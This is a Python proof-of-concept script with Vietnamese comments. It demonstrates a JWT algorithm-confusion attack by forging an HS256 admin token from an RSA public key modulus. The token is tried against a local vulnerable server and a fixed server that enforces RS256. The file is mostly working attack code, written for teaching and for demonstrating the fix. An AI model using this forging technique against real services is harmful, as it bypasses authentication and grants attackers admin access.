# attack.py
import jwt
from vuln_server import server as v_server, exposed_public_key
from fixed_server import fixed_server as f_server
from Crypto.PublicKey import RSA

# --- MÀU SẮC ---
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def run_attack():
    print("--- POC: JWT ALGORITHM CONFUSION ATTACK ---")
    
    # 1. Chuẩn bị Payload độc hại
    malicious_payload = {"user": "hacker", "role": "admin"}
    
    # Parse public key để lấy modulus (n) làm HMAC secret
    pub_key = RSA.import_key(exposed_public_key)
    hmac_secret = pub_key.n.to_bytes((pub_key.n.bit_length() + 7) // 8, 'big')
    
    print(f"\n[INFO] Hacker có Public Key (độ dài {len(exposed_public_key)} bytes)")
    print(f"[INFO] Sử dụng modulus làm HMAC secret (độ dài {len(hmac_secret)} bytes)")
    print("[INFO] Hacker đang tạo token giả mạo bằng thuật toán HS256...")
    
    # --- TẠO TOKEN GIẢ ---
    # Hacker dùng modulus của Public Key làm SECRET KEY cho thuật toán HS256
    forged_token = jwt.encode(
        malicious_payload,
        hmac_secret, # <-- Sử dụng modulus làm HMAC secret
        algorithm="HS256"
    )
    print(f"[GEN] Token giả: {forged_token[:20]}...")

    # ==================================================
    # MỤC TIÊU 1: VULNERABLE SERVER
    # ==================================================
    print(f"\n{'-'*10} TẤN CÔNG VULNERABLE SERVER {'-'*10}")
    
    # Lưu ý: Server này dùng key RSA của riêng nó, nhưng ở đây ta giả lập
    # hacker lấy được public key của nó (biến exposed_public_key được import từ vuln_server)
    
    is_valid, data = v_server.verify_request(forged_token)
    
    if is_valid and data.get('role') == 'admin':
        print(f"{GREEN}>>> THÀNH CÔNG! Server Lỗi đã chấp nhận token giả.{RESET}")
        print(f"    Data decoded: {data}")
        print(f"    Lý do: Server thấy header 'HS256' -> Dùng Public Key làm mật khẩu verify -> Khớp!")
    else:
        print(f"{RED}>>> THẤT BẠI.{RESET} Error: {data}")


    # ==================================================
    # MỤC TIÊU 2: SECURE SERVER
    # ==================================================
    print(f"\n{'-'*10} TẤN CÔNG SECURE SERVER {'-'*10}")
    
    # Để test công bằng, ta cần tạo token giả bằng public key của Secure Server
    # (Giả sử hacker cũng lấy được public key của server này)
    target_pub_key = f_server.public_pem
    target_pub_parsed = RSA.import_key(target_pub_key)
    target_hmac_secret = target_pub_parsed.n.to_bytes((target_pub_parsed.n.bit_length() + 7) // 8, 'big')
    
    forged_token_2 = jwt.encode(
        malicious_payload,
        target_hmac_secret, 
        algorithm="HS256"
    )
    
    is_valid, data = f_server.verify_request(forged_token_2)
    
    if is_valid:
        print(f"{RED}>>> NGUY HIỂM! Secure Server bị hack (Điều này không nên xảy ra).{RESET}")
    else:
        print(f"{GREEN}>>> BỊ CHẶN! Secure Server từ chối token.{RESET}")
        print(f"    Lỗi trả về: {data}")
        print(f"    Lý do: Server ép buộc thuật toán phải là RS256, nhưng token là HS256.")

if __name__ == "__main__":
    run_attack()